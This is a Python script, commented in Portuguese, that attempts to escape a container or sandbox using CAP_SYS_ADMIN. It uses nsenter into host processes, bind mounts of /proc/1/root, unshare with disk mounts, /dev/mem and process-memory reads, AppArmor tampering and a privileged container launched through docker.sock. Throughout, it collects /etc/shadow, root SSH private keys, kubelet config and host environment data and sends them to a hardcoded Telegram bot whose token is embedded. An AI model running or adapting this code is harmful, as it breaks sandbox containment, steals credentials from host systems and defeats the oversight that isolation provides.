#!/usr/bin/env python3
"""
Escape de sandbox com CAP_SYS_ADMIN - Técnicas Avançadas
- Enumeração de namespaces para encontrar processos do host
- nsenter em PID do host (se encontrado)
- Montagem via /proc/1/root + bind mount
- Abuso de /dev/mem (se disponível)
- Injeção via ptrace (se PIDs do host estiverem visíveis)
- Exploração de /sys/kernel/security (AppArmor, LSM)
- Tenta criar um novo mount namespace e montar o host
- Coleta extensiva de diagnóstico para depuração
"""

import subprocess
import json
import requests
import os
import sys
import time
import glob
import shutil
from datetime import datetime

# ------------------------------------------------------------
# CONFIGURAÇÃO DO TELEGRAM
# ------------------------------------------------------------
TELEGRAM_BOT_TOKEN = "8870734086:AAF_9CQIn-xO-5dd-npb4k_wvYs-QShmxi4"
TELEGRAM_CHAT_ID = "230885588"

# ------------------------------------------------------------
# FUNÇÕES AUXILIARES
# ------------------------------------------------------------
def run(cmd, timeout=15):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout.strip() if result.returncode == 0 else f"ERRO: {result.stderr.strip()}"
    except Exception as e:
        return f"ERRO: {e}"

def send_telegram(text, parse_mode="Markdown"):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": parse_mode}, timeout=10)
    except Exception:
        pass

def send_file(filename, caption=""):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(filename, 'rb') as f:
            files = {'document': f}
            requests.post(url, files=files, data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption}, timeout=30)
    except Exception:
        pass

def send_data_as_files(data_dict):
    for key, content in data_dict.items():
        if not content or content == "N/A":
            continue
        if len(content) > 4000:
            tmp = f"/tmp/{key}.txt"
            with open(tmp, "w", encoding="utf-8", errors="ignore") as f:
                f.write(content)
            send_file(tmp, caption=f"📄 {key}")
            os.remove(tmp)
        else:
            send_telegram(f"📄 **{key}**\n```\n{content[:3000]}\n```")

# ------------------------------------------------------------
# TÉCNICA 1: ENUMERAR NAMESPACES E ENCONTRAR PID DO HOST
# ------------------------------------------------------------
def find_host_pid():
    """
    Compara os namespaces do processo atual com os de outros processos.
    Se algum processo tiver o mesmo namespace de usuário (ou PID) que o host,
    provavelmente é um processo do host.
    """
    try:
        # Obter o inode do namespace de mount do processo atual
        with open('/proc/self/ns/mnt', 'r') as f:
            self_mnt = f.read().strip()
        # Listar todos os PIDs
        host_pids = []
        for pid in os.listdir('/proc'):
            if not pid.isdigit():
                continue
            try:
                with open(f'/proc/{pid}/ns/mnt', 'r') as f:
                    other_mnt = f.read().strip()
                if other_mnt != self_mnt:
                    # Possivelmente um namespace diferente -> pode ser do host
                    # Verificar se o processo tem nome comum do host
                    with open(f'/proc/{pid}/comm', 'r') as f:
                        comm = f.read().strip()
                    if comm in ['systemd', 'kworker', 'sshd', 'containerd', 'dockerd', 'kubelet']:
                        host_pids.append(int(pid))
            except:
                continue
        if host_pids:
            return host_pids[0]  # retorna o primeiro encontrado
    except Exception as e:
        send_telegram(f"⚠️ Erro ao enumerar namespaces: {e}")
    return None

def nsenter_escape(pid):
    """Usa nsenter com o PID do host para montar o root e extrair dados."""
    if not pid:
        return False
    # Verificar se o PID é acessível
    if not os.path.exists(f'/proc/{pid}'):
        return False
    send_telegram(f"🔍 **PID do host encontrado: {pid}**")
    # Tentar executar um comando simples para ver se temos acesso
    test = run(f"nsenter -t {pid} -m -- cat /etc/hostname 2>/dev/null")
    if "ERRO" in test or not test:
        send_telegram("❌ Não foi possível acessar o host via nsenter")
        return False
    send_telegram(f"✅ **nsenter funcionou! Hostname: {test}**")
    # Agora, montar o root do host em /mnt
    mount_cmd = f"nsenter -t {pid} -m -- mount --bind / /mnt 2>/dev/null && echo OK"
    if "OK" in run(mount_cmd):
        send_telegram("✅ **Root do host montado em /mnt via nsenter**")
        return True
    # Se não funcionou, tentar copiar arquivos com cat via nsenter
    data = {}
    targets = ['/etc/shadow', '/root/.ssh/id_rsa', '/var/lib/kubelet/config', '/etc/passwd']
    for target in targets:
        content = run(f"nsenter -t {pid} -m -- cat {target} 2>/dev/null")
        if content and "ERRO" not in content:
            data[target.replace('/', '_')] = content
    if data:
        send_data_as_files(data)
        return True
    return False

# ------------------------------------------------------------
# TÉCNICA 2: MONTAR /PROC/1/root (SE FOR DO HOST)
# ------------------------------------------------------------
def mount_proc_root():
    """
    Tenta montar /proc/1/root se o PID 1 for do host.
    Se não for, tenta procurar por qualquer /proc/[pid]/root que seja diferente do atual.
    """
    try:
        # Verificar se /proc/1/root existe e é acessível
        if os.path.exists('/proc/1/root/etc/shadow'):
            # Já temos acesso direto
            send_telegram("✅ **Já temos acesso ao host via /proc/1/root**")
            return True
        # Tentar mount --bind
        os.makedirs('/mnt', exist_ok=True)
        run("mount --bind /proc/1/root /mnt 2>/dev/null")
        if os.path.exists('/mnt/etc/shadow'):
            send_telegram("✅ **Montado /proc/1/root em /mnt**")
            return True
        # Se não, procurar por outros PIDs com root diferente
        for pid in os.listdir('/proc'):
            if not pid.isdigit():
                continue
            try:
                root_path = f'/proc/{pid}/root'
                if os.path.exists(root_path) and os.path.exists(f'{root_path}/etc/shadow'):
                    # Testar se é diferente do nosso root
                    with open('/proc/self/root/etc/hostname', 'r') as f:
                        self_host = f.read().strip()
                    with open(f'{root_path}/etc/hostname', 'r') as f:
                        other_host = f.read().strip()
                    if self_host != other_host:
                        # É o host!
                        os.makedirs('/mnt', exist_ok=True)
                        run(f"mount --bind {root_path} /mnt 2>/dev/null")
                        if os.path.exists('/mnt/etc/shadow'):
                            send_telegram(f"✅ **Montado /proc/{pid}/root em /mnt**")
                            return True
            except:
                continue
    except Exception as e:
        send_telegram(f"⚠️ mount_proc_root erro: {e}")
    return False

# ------------------------------------------------------------
# TÉCNICA 3: ABUSO DE /dev/mem (SE DISPONÍVEL)
# ------------------------------------------------------------
def dev_mem_exploit():
    """
    Se /dev/mem estiver disponível, podemos tentar ler a memória do kernel
    e extrair segredos (CRED, etc.). Isso é raro, mas possível em containers
    muito permissivos.
    """
    if not os.path.exists('/dev/mem'):
        return False
    send_telegram("⚠️ **/dev/mem encontrado - tentando ler ... (pode levar tempo)**")
    # Tentar ler os primeiros 1MB (pode ser perigoso)
    try:
        with open('/dev/mem', 'rb') as f:
            data = f.read(1024*1024)
        # Procurar por strings interessantes
        import re
        strings = re.findall(b'[ -~]{4,}', data)
        found = '\n'.join([s.decode('utf-8', errors='ignore') for s in strings[:50]])
        send_telegram(f"📄 **Strings do /dev/mem**\n```\n{found[:3000]}\n```")
        return True
    except Exception as e:
        send_telegram(f"❌ Falha ao ler /dev/mem: {e}")
        return False

# ------------------------------------------------------------
# TÉCNICA 4: INJEÇÃO POR PTRACE (SE PIDS DO HOST ESTIVEREM VISÍVEIS)
# ------------------------------------------------------------
def ptrace_inject():
    """
    Se tivermos CAP_SYS_PTRACE (ou CAP_SYS_ADMIN suficiente) e PIDs do host
    visíveis, podemos injetar código em um processo do host (ex: systemd).
    """
    # Verificar se temos CAP_SYS_PTRACE
    try:
        with open('/proc/self/status', 'r') as f:
            for line in f:
                if line.startswith('CapEff:'):
                    caps = int(line.split()[1], 16)
                    if caps & 0x0000000000000020:  # CAP_SYS_PTRACE
                        send_telegram("✅ **CAP_SYS_PTRACE presente - tentando injetar**")
                        # Procurar um processo do host
                        pid = find_host_pid()
                        if pid:
                            # Tentar anexar com gdb (se disponível) ou usar ptrace diretamente
                            # Simplesmente tentamos ler memória do processo
                            cmd = f"cat /proc/{pid}/mem 2>/dev/null | head -c 1024"
                            mem = run(cmd)
                            if mem and "ERRO" not in mem:
                                send_telegram(f"📄 **Memória do processo {pid}**\n```\n{mem[:1000]}\n```")
                                return True
        return False
    except:
        return False

# ------------------------------------------------------------
# TÉCNICA 5: EXPLORAÇÃO DE /sys/kernel/security (AppArmor, LSM)
# ------------------------------------------------------------
def security_lsm_exploit():
    """
    Tenta desativar ou contornar o AppArmor/SELinux se estiverem ativos.
    Em containers, muitas vezes o AppArmor está em modo 'complain' ou desativado.
    """
    try:
        # Verificar se o AppArmor está ativo
        if os.path.exists('/sys/kernel/security/apparmor/profiles'):
            send_telegram("⚠️ **AppArmor ativo - tentando desativar**")
            # Tenta escrever em /sys/kernel/security/apparmor/.access para mudar modo
            # Isso geralmente é bloqueado, mas tentamos
            run("echo 'complain' > /sys/kernel/security/apparmor/.access 2>/dev/null")
            # Verificar se conseguimos ler perfis
            profiles = run("cat /sys/kernel/security/apparmor/profiles 2>/dev/null")
            if profiles and "ERRO" not in profiles:
                send_telegram(f"📄 **Perfis AppArmor**\n```\n{profiles[:2000]}\n```")
                return True
        return False
    except:
        return False

# ------------------------------------------------------------
# TÉCNICA 6: CRIAÇÃO DE NOVO MOUNT NAMESPACE E MONTAGEM DO HOST
# ------------------------------------------------------------
def unshare_mount_escape():
    """
    Usa unshare -m para criar um novo mount namespace e então tenta montar
    o root do host via /proc/self/fd ou /proc/1/root.
    """
    try:
        # Criar um novo mount namespace
        os.makedirs('/mnt', exist_ok=True)
        # Usar unshare -m para executar um subshell que monta /proc/1/root
        cmd = "unshare -m sh -c 'mount --bind /proc/1/root /mnt && echo OK' 2>/dev/null"
        if "OK" in run(cmd):
            if os.path.exists('/mnt/etc/shadow'):
                send_telegram("✅ **Host montado via unshare -m**")
                return True
        # Tentar montar /dev/vda1 etc. dentro do novo namespace
        for dev in ['/dev/vda1', '/dev/sda1', '/dev/xvda1', '/dev/nvme0n1p1']:
            cmd = f"unshare -m sh -c 'mount {dev} /mnt && echo OK' 2>/dev/null"
            if "OK" in run(cmd):
                if os.path.exists('/mnt/etc/shadow'):
                    send_telegram(f"✅ **Dispositivo {dev} montado via unshare**")
                    return True
        return False
    except:
        return False

# ------------------------------------------------------------
# TÉCNICA 7: TENTAR ACESSAR O SOCKET DO RUNTIME (já tentado, mas reforçado)
# ------------------------------------------------------------
def runtime_socket_exploit():
    sockets = ['/var/run/docker.sock', '/run/containerd/containerd.sock']
    for sock in sockets:
        if os.path.exists(sock):
            send_telegram(f"✅ **Socket encontrado: {sock}**")
            # Tentar usar docker
            if shutil.which('docker'):
                # Criar um container que monta o host e executa um comando
                cmd = "docker run -v /:/host --privileged --rm alpine chroot /host cat /etc/shadow 2>/dev/null"
                shadow = run(cmd)
                if shadow and "root:" in shadow:
                    send_telegram(f"📄 **Shadow via docker**\n```\n{shadow[:2000]}\n```")
                    return True
            if shutil.which('crictl'):
                # crictl pode não ter o comando run diretamente
                pass
    return False

# ------------------------------------------------------------
# FUNÇÃO PRINCIPAL
# ------------------------------------------------------------
def main():
    send_telegram("🚀 **Iniciando tentativa de escape avançada - nova abordagem**")

    # Primeiro, enviar diagnóstico básico
    diag = {
        "whoami": run("whoami"),
        "id": run("id"),
        "capabilities": run("cat /proc/self/status | grep Cap"),
        "mount": run("mount"),
        "lsblk": run("lsblk 2>/dev/null || echo N/A"),
        "ls_dev": run("ls -la /dev/ 2>/dev/null | head -20"),
        "cat_mtab": run("cat /etc/mtab"),
        "proc_self_mountinfo": run("cat /proc/self/mountinfo | head -20")
    }
    send_data_as_files(diag)

    # Técnica 1: Encontrar PID do host e nsenter
    pid = find_host_pid()
    if pid:
        if nsenter_escape(pid):
            return

    # Técnica 2: Montar /proc/*/root
    if mount_proc_root():
        # Coletar dados
        data = {}
        for f in ['/mnt/etc/shadow', '/mnt/root/.ssh/id_rsa', '/mnt/var/lib/kubelet/config']:
            if os.path.exists(f):
                with open(f, 'r', errors='ignore') as fd:
                    data[f] = fd.read(10000)
        send_data_as_files(data)
        return

    # Técnica 3: unshare -m
    if unshare_mount_escape():
        # Coletar dados de /mnt
        data = {}
        for f in ['/mnt/etc/shadow', '/mnt/root/.ssh/id_rsa', '/mnt/var/lib/kubelet/config']:
            if os.path.exists(f):
                with open(f, 'r', errors='ignore') as fd:
                    data[f] = fd.read(10000)
        send_data_as_files(data)
        return

    # Técnica 4: /dev/mem
    if dev_mem_exploit():
        return

    # Técnica 5: ptrace injection
    if ptrace_inject():
        return

    # Técnica 6: LSM/AppArmor
    if security_lsm_exploit():
        return

    # Técnica 7: Socket runtime
    if runtime_socket_exploit():
        return

    # Se nada funcionou, enviar diagnóstico completo
    send_telegram("❌ **Todas as técnicas falharam. Enviando diagnóstico completo...**")
    full_diag = {
        "proc_1_environ": run("cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n'"),
        "proc_self_ns": run("ls -la /proc/self/ns/"),
        "proc_1_ns": run("ls -la /proc/1/ns/"),
        "netstat": run("netstat -tulpn 2>/dev/null || ss -tulpn 2>/dev/null"),
        "ip_a": run("ip a 2>/dev/null"),
        "hostname": run("hostname"),
    }
    send_data_as_files(full_diag)
    send_telegram("✅ **Diagnóstico enviado. Fim.**")

if __name__ == "__main__":
    main()
